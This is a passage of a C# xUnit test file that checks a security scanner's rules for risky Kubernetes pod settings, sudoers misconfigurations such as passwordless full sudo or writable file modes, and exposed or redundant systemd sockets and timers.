                    Name = "bad-pod",
                    HostIpc = true,
                    Containers = Array.Empty<K8sContainerInfo>()
                }
            }
        };

        var result = rule.Evaluate(data);

        Assert.False(result.Passed);
        Assert.Equal(Severity.High, result.Severity);
    }

    [Fact]
    public void K8sHostNamespaceRule_Safe_Passes()
    {
        var rule = new K8sHostNamespaceRule();
        var data = new ScanData
        {
            KubernetesPods = new[]
            {
                new KubernetesPodInfo
                {
                    Namespace = "default",
                    Name = "safe-pod",
                    Violations = Array.Empty<string>(),
                    Containers = Array.Empty<K8sContainerInfo>()
                }
            }
        };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
    }

    [Fact]
    public void K8sRunAsRootRule_RootAllowed_Fails()
    {
        var rule = new K8sRunAsRootRule();
        var data = new ScanData
        {
            KubernetesPods = new[]
            {
                new KubernetesPodInfo
                {
                    Namespace = "default",
                    Name = "bad-pod",
                    Containers = new[]
                    {
                        new K8sContainerInfo { Name = "app", Image = "app:1.0", RunAsRoot = true }
                    }
                }
            }
        };

        var result = rule.Evaluate(data);

        Assert.False(result.Passed);
        Assert.Equal(Severity.High, result.Severity);
    }

    [Fact]
    public void K8sRunAsRootRule_NonRoot_Passes()
    {
        var rule = new K8sRunAsRootRule();
        var data = new ScanData
        {
            KubernetesPods = new[]
            {
                new KubernetesPodInfo
                {
                    Namespace = "default",
                    Name = "safe-pod",
                    Containers = new[]
                    {
                        new K8sContainerInfo { Name = "app", Image = "app:1.0", RunAsRoot = false }
                    }
                }
            }
        };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
    }

    [Fact]
    public void K8sRunAsRootRule_RunAsUser1000_Passes()
    {
        var rule = new K8sRunAsRootRule();
        var data = new ScanData
        {
            KubernetesPods = new[]
            {
                new KubernetesPodInfo
                {
                    Namespace = "default",
                    Name = "safe-pod",
                    Containers = new[]
                    {
                        new K8sContainerInfo { Name = "app", Image = "app:1.0", RunAsRoot = false }
                    }
                }
            }
        };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
    }

    [Fact]
    public void K8sSecurityContextRule_MissingHardening_Fails()
    {
        var rule = new K8sSecurityContextRule();
        var data = new ScanData
        {
            KubernetesPods = new[]
            {
                new KubernetesPodInfo
                {
                    Namespace = "default",
                    Name = "bad-pod",
                    Containers = new[]
                    {
                        new K8sContainerInfo { Name = "app", Image = "app:1.0", ReadOnlyRootFilesystem = false, DropAllCapabilities = false, SeccompProfile = "" }
                    }
                }
            }
        };

        var result = rule.Evaluate(data);

        Assert.False(result.Passed);
        Assert.Equal(Severity.Medium, result.Severity);
    }

    [Fact]
    public void K8sSecurityContextRule_UnconfinedSeccomp_Fails()
    {
        var rule = new K8sSecurityContextRule();
        var data = new ScanData
        {
            KubernetesPods = new[]
            {
                new KubernetesPodInfo
                {
                    Namespace = "default",
                    Name = "bad-pod",
                    Containers = new[]
                    {
                        new K8sContainerInfo
                        {
                            Name = "app",
                            Image = "app:1.0",
                            AllowPrivilegeEscalation = false,
                            ReadOnlyRootFilesystem = true,
                            DropAllCapabilities = true,
                            SeccompProfile = "Unconfined"
                        }
                    }
                }
            }
        };

        var result = rule.Evaluate(data);

        Assert.False(result.Passed);
        Assert.Equal(Severity.Medium, result.Severity);
    }

    [Fact]
    public void K8sSecurityContextRule_Hardened_Passes()
    {
        var rule = new K8sSecurityContextRule();
        var data = new ScanData
        {
            KubernetesPods = new[]
            {
                new KubernetesPodInfo
                {
                    Namespace = "default",
                    Name = "safe-pod",
                    Containers = new[]
                    {
                        new K8sContainerInfo { Name = "app", Image = "app:1.0", ReadOnlyRootFilesystem = true, DropAllCapabilities = true, SeccompProfile = "RuntimeDefault" }
                    }
                }
            }
        };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
    }

    [Fact]
    public void KubernetesRules_MissingData_Passes()
    {
        var data = new ScanData { KubernetesPods = Array.Empty<KubernetesPodInfo>() };

        Assert.True(new K8sPrivilegedPodRule().Evaluate(data).Passed);
        Assert.True(new K8sHostNamespaceRule().Evaluate(data).Passed);
        Assert.True(new K8sRunAsRootRule().Evaluate(data).Passed);
        Assert.True(new K8sSecurityContextRule().Evaluate(data).Passed);
    }

    [Fact]
    public void SudoersFilePermissionRule_PermissiveMode_Fails()
    {
        var rule = new SudoersFilePermissionRule();
        var data = new ScanData
        {
            SudoersConfig = new SudoersConfig
            {
                ConfigReadable = true,
                MainFileMode = "0644",
                MainFileOwner = "root"
            }
        };

        var result = rule.Evaluate(data);

        Assert.False(result.Passed);
        Assert.Equal(Severity.Critical, result.Severity);
    }

    [Theory]
    [InlineData("abc")]      // not numeric
    [InlineData("999")]      // valid digits, but not octal (8/9)
    [InlineData("100440")]   // raw st_mode (S_IFREG|0440); value 0o100440 exceeds %a's 0o7777 max
    public void SudoersFilePermissionRule_UnparseableMode_Fails(string mode)
    {
        var rule = new SudoersFilePermissionRule();
        var data = new ScanData
        {
            SudoersConfig = new SudoersConfig
            {
                ConfigReadable = true,
                MainFileMode = mode,
                MainFileOwner = "root"
            }
        };

        var result = rule.Evaluate(data);

        Assert.False(result.Passed);
        Assert.Equal(Severity.Critical, result.Severity);
    }

    [Fact]
    public void SudoersFilePermissionRule_NonRootOwner_Fails()
    {
        var rule = new SudoersFilePermissionRule();
        var data = new ScanData
        {
            SudoersConfig = new SudoersConfig
            {
                ConfigReadable = true,
                MainFileMode = "0440",
                MainFileOwner = "admin"
            }
        };

        var result = rule.Evaluate(data);

        Assert.False(result.Passed);
        Assert.Equal(Severity.Critical, result.Severity);
    }

    [Fact]
    public void SudoersFilePermissionRule_Hardened_Passes()
    {
        var rule = new SudoersFilePermissionRule();
        var data = new ScanData
        {
            SudoersConfig = new SudoersConfig
            {
                ConfigReadable = true,
                MainFileMode = "0440",
                MainFileOwner = "root"
            }
        };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
    }

    [Theory]
    [InlineData("660")]   // group-writable
    [InlineData("770")]   // group-writable
    [InlineData("666")]   // group- and other-writable
    [InlineData("646")]   // other-writable
    [InlineData("777")]   // world-writable
    [InlineData("1777")]  // sticky world-writable
    [InlineData("4755")]  // setuid but world-readable
    [InlineData("0660")]
    [InlineData("0770")]
    public void SudoersFilePermissionRule_WritableBits_Fails(string mode)
    {
        var rule = new SudoersFilePermissionRule();
        var data = new ScanData
        {
            SudoersConfig = new SudoersConfig
            {
                ConfigReadable = true,
                MainFileMode = mode,
                MainFileOwner = "root"
            }
        };

        var result = rule.Evaluate(data);

        Assert.False(result.Passed);
        Assert.Equal(Severity.Critical, result.Severity);
    }

    [Theory]
    [InlineData("0440")]  // canonical
    [InlineData("0400")]  // stricter: root read-only
    [InlineData("440")]
    [InlineData("400")]
    [InlineData("0")]     // zero bits: no writes
    [InlineData("04000")] // setuid only
    [InlineData("04440")] // setuid + owner/group read, no writes
    public void SudoersFilePermissionRule_SafeModes_Pass(string mode)
    {
        var rule = new SudoersFilePermissionRule();
        var data = new ScanData
        {
            SudoersConfig = new SudoersConfig
            {
                ConfigReadable = true,
                MainFileMode = mode,
                MainFileOwner = "root"
            }
        };

        Assert.True(rule.Evaluate(data).Passed);
    }

    [Fact]
    public void SudoersNoPasswordlessFullSudoRule_PasswordlessFullSudo_Fails()
    {
        var rule = new SudoersNoPasswordlessFullSudoRule();
        var data = new ScanData
        {
            SudoersConfig = new SudoersConfig
            {
                ConfigReadable = true,
                HasPasswordlessFullSudo = true,
                Entries = new[]
                {
                    new SudoersEntry
                    {
                        Principal = "admin",
                        Hosts = "ALL",
                        RunAs = "(ALL:ALL)",
                        Commands = "ALL",
                        NoPasswd = true
                    }
                }
            }
        };

        var result = rule.Evaluate(data);

        Assert.False(result.Passed);
        Assert.Equal(Severity.Critical, result.Severity);
    }

    [Fact]
    public void SudoersNoPasswordlessFullSudoRule_NoPasswordless_Passes()
    {
        var rule = new SudoersNoPasswordlessFullSudoRule();
        var data = new ScanData
        {
            SudoersConfig = new SudoersConfig
            {
                ConfigReadable = true,
                HasPasswordlessFullSudo = false
            }
        };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
    }

    [Fact]
    public void SudoersFullSudoRule_FullSudo_Fails()
    {
        var rule = new SudoersFullSudoRule();
        var data = new ScanData
        {
            SudoersConfig = new SudoersConfig
            {
                ConfigReadable = true,
                HasFullSudo = true,
                Entries = new[]
                {
                    new SudoersEntry
                    {
                        Principal = "%wheel",
                        Hosts = "ALL",
                        RunAs = "(ALL:ALL)",
                        Commands = "ALL",
                        NoPasswd = false
                    }
                }
            }
        };

        var result = rule.Evaluate(data);

        Assert.False(result.Passed);
        Assert.Equal(Severity.High, result.Severity);
    }

    [Fact]
    public void SudoersFullSudoRule_NoFullSudo_Passes()
    {
        var rule = new SudoersFullSudoRule();
        var data = new ScanData
        {
            SudoersConfig = new SudoersConfig
            {
                ConfigReadable = true,
                HasFullSudo = false
            }
        };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
    }

    [Fact]
    public void SudoersNoAuthenticateRule_NoAuthenticate_Fails()
    {
        var rule = new SudoersNoAuthenticateRule();
        var data = new ScanData
        {
            SudoersConfig = new SudoersConfig
            {
                ConfigReadable = true,
                HasNoAuthenticate = true
            }
        };

        var result = rule.Evaluate(data);

        Assert.False(result.Passed);
        Assert.Equal(Severity.Critical, result.Severity);
    }

    [Fact]
    public void SudoersNoAuthenticateRule_Authenticate_Passes()
    {
        var rule = new SudoersNoAuthenticateRule();
        var data = new ScanData
        {
            SudoersConfig = new SudoersConfig
            {
                ConfigReadable = true,
                HasNoAuthenticate = false
            }
        };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
    }

    [Fact]
    public void SudoersSecurePathRule_MissingSecurePath_Fails()
    {
        var rule = new SudoersSecurePathRule();
        var data = new ScanData
        {
            SudoersConfig = new SudoersConfig
            {
                ConfigReadable = true,
                HasSecurePath = false
            }
        };

        var result = rule.Evaluate(data);

        Assert.False(result.Passed);
        Assert.Equal(Severity.Medium, result.Severity);
    }

    [Fact]
    public void SudoersSecurePathRule_HasSecurePath_Passes()
    {
        var rule = new SudoersSecurePathRule();
        var data = new ScanData
        {
            SudoersConfig = new SudoersConfig
            {
                ConfigReadable = true,
                HasSecurePath = true
            }
        };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
    }

    [Fact]
    public void SystemdShortTimerIntervalRule_ShortInterval_Fails()
    {
        var rule = new SystemdShortTimerIntervalRule();
        var data = new ScanData
        {
            SystemdTimerSocketConfig = new SystemdTimerSocketConfig
            {
                ConfigReadable = true,
                Timers = new[]
                {
                    new SystemdTimer { Name = "rapid.timer", Active = true, Interval = "30s" }
                }
            }
        };

        var result = rule.Evaluate(data);

        Assert.False(result.Passed);
        Assert.Equal(Severity.Medium, result.Severity);
    }

    [Fact]
    public void SystemdShortTimerIntervalRule_LongInterval_Passes()
    {
        var rule = new SystemdShortTimerIntervalRule();
        var data = new ScanData
        {
            SystemdTimerSocketConfig = new SystemdTimerSocketConfig
            {
                ConfigReadable = true,
                Timers = new[]
                {
                    new SystemdTimer { Name = "daily.timer", Active = true, Interval = "1h" }
                }
            }
        };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
    }

    [Fact]
    public void SystemdPublicSocketRule_PublicSocket_Fails()
    {
        var rule = new SystemdPublicSocketRule();
        var data = new ScanData
        {
            SystemdTimerSocketConfig = new SystemdTimerSocketConfig
            {
                ConfigReadable = true,
                Sockets = new[]
                {
                    new SystemdSocket { Name = "ssh.socket", Listening = true, ListenAddress = "0.0.0.0:22" }
                }
            }
        };

        var result = rule.Evaluate(data);

        Assert.False(result.Passed);
        Assert.Equal(Severity.High, result.Severity);
    }

    [Fact]
    public void SystemdPublicSocketRule_LocalSocket_Passes()
    {
        var rule = new SystemdPublicSocketRule();
        var data = new ScanData
        {
            SystemdTimerSocketConfig = new SystemdTimerSocketConfig
            {
                ConfigReadable = true,
                Sockets = new[]
                {
                    new SystemdSocket { Name = "syslog.socket", Listening = true, ListenAddress = "/run/systemd/journal/syslog" }
                }
            }
        };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
    }

    [Fact]
    public void SystemdRedundantSocketServiceRule_RedundantPair_Fails()
    {
        var rule = new SystemdRedundantSocketServiceRule();
        var data = new ScanData
        {
            RunningServices = new[]
            {
                new RunningService { Name = "ssh.service", State = "running" }
            },
            SystemdTimerSocketConfig = new SystemdTimerSocketConfig
            {
                ConfigReadable = true,
                Sockets = new[]
                {
                    new SystemdSocket { Name = "ssh.socket", Listening = true, TriggerUnit = "ssh.service" }
                }
            }
        };

        var result = rule.Evaluate(data);

        Assert.False(result.Passed);
        Assert.Equal(Severity.Low, result.Severity);
    }

    [Fact]
    public void SystemdRedundantSocketServiceRule_NoRedundancy_Passes()
    {
        var rule = new SystemdRedundantSocketServiceRule();
        var data = new ScanData
        {
            RunningServices = Array.Empty<RunningService>(),
            SystemdTimerSocketConfig = new SystemdTimerSocketConfig
            {
                ConfigReadable = true,
                Sockets = new[]
                {
                    new SystemdSocket { Name = "ssh.socket", Listening = true, TriggerUnit = "ssh.service" }
                }
            }
        };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
    }

    [Fact]
    public void SystemdRedundantSocketServiceRule_InactiveSocket_Passes()
    {
        var rule = new SystemdRedundantSocketServiceRule();
        var data = new ScanData
        {
            RunningServices = new[]
            {
                new RunningService { Name = "ssh.service", State = "running" }
            },
            SystemdTimerSocketConfig = new SystemdTimerSocketConfig
            {
                ConfigReadable = true,
                Sockets = new[]
                {
                    new SystemdSocket { Name = "ssh.socket", Listening = false, TriggerUnit = "ssh.service" }
                }
            }
        };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
    }

    [Fact]
    public void SudoersRules_MissingData_Passes()
    {
        var data = new ScanData { SudoersConfig = null };

        Assert.True(new SudoersFilePermissionRule().Evaluate(data).Passed);
        Assert.True(new SudoersNoPasswordlessFullSudoRule().Evaluate(data).Passed);
        Assert.True(new SudoersFullSudoRule().Evaluate(data).Passed);
        Assert.True(new SudoersNoAuthenticateRule().Evaluate(data).Passed);
        Assert.True(new SudoersSecurePathRule().Evaluate(data).Passed);
    }
}
